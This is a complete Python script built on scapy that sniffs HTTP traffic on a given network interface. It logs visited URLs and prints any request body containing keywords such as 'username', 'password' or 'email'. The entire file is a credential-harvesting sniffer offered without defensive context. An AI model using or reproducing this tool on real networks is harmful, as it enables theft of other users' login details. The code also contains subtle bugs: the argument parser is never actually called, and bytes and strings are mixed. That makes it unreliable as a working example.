import scapy.all as scapy
import argparse
from scapy.layers import http
def interfaces():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="specify interface")
    arguments = parser.parse_args
    return arguments.interface
def sniff(inter):
    scapy.sniff(iface=inter, store=False, prn=processpac)
def processpac(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Http URL " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break

inter=interfaces()
sniff(inter)
